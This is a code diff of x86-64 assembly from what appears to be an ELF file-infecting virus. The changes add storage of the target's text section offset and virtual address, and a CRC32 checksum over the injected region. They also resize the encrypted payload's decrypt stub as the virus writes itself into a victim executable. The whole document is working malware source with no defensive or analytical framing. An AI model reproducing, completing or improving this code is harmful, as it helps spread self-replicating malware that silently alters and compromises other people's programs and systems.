@@ -32,6 +32,8 @@ _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_siz
 	; rsp + 116 index mmap_tmp
 	; rsp + 124 set to 1 if infection worked, 0 else
 	; rsp + 132 key addr
+	; rsp + 140 text section offset in file
+	; rsp + 148 text section vaddr
 	;;;;;;;;;;;;;;;;;;;;;
 
 ; init phase
@@ -118,6 +120,13 @@ _else_if:
 ; virus offset = phdr->p_offset + phdr->p_filesz
 	mov r10, QWORD [rsp + 32] ; take phdr
 	add r10, 8 ; add 8 bytes to take p_offset (offset of the segment in file)
+	mov r12, QWORD [r10]
+	mov QWORD [rsp + 140], r12
+	mov r12, r10
+	add r12, 8
+	mov r12, QWORD [r12]
+	mov QWORD [rsp + 148], r12
+
 	mov r11, QWORD [r10] ; dereference it to take the value
 	mov QWORD [rsp + 72], r11 ; store it on stack, virus_offset = phdr->p_offset
 	add r10, 24 ; offset of p_filesz is 32, we already added 8, so 32 - 8 = 24.
@@ -148,8 +157,8 @@ _else_if:
 	add r11, 8 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
 ; calcul _decrypt size
 	lea rdi, [rel _decrypt]
-	lea rsi, [rel _end_decrypt]
-	add rsi, 2
+	lea rsi, [rel _checksum]
+	add rsi, 4
 	sub rsi, rdi
 ; add key_size and decrypt size to p_filesz and p_memsz
 	add r11, 256 ; add key size
@@ -197,8 +206,8 @@ _if_offset_equal_virus_offset:
 	add r10, 8 ; add the 8 bytes of o_entry
 ; calcul _decrypt size
 	lea rdi, [rel _decrypt]
-	lea rsi, [rel _end_decrypt]
-	add rsi, 2
+	lea rsi, [rel _checksum]
+	add rsi, 4
 	sub rsi, rdi
 ; add key size and decrypt size on sh_size
 	add r10, 256 ; add key size
@@ -355,15 +364,35 @@ _base_binary:
 	sub rcx, rsi
 	add QWORD [rsp + 116], rcx
 
+_store_section_vaddr:
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	mov r10, QWORD [rsp + 148]
+	mov QWORD [rdi], r10
+	add QWORD [rsp + 116], 12
+
+_calcul_checksum:
+	mov rsi, QWORD [rsp + 116]
+	sub rsi, QWORD [rsp + 140]
+	add rdi, 8
+	mov DWORD [rdi], esi
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 140]
+	call _crc32
+	mov rdi, QWORD [rsp + 108]
+	add rdi, QWORD [rsp + 116]
+	mov DWORD [rdi], eax
+	add QWORD [rsp + 116], 4
+
 _align_to_page_size:
 ; for i < PAGE_SIZE - (virus_size + 8 + key_size(256) + decrypt_size) memset(mmap_tmp, 0, 1);
 	mov QWORD [rsp + 88], PAGE_SIZE
 	mov rdi, QWORD [rsp + 16]
 	add rdi, 8
 	add rdi, 256
-	lea r10, [rel _end_decrypt]
+	lea r10, [rel _checksum]
 	lea r11, [rel _decrypt]
-	add r10, 2
+	add r10, 4
 	sub r10, r11
 	add rdi, r10
 	sub QWORD [rsp + 88], rdi
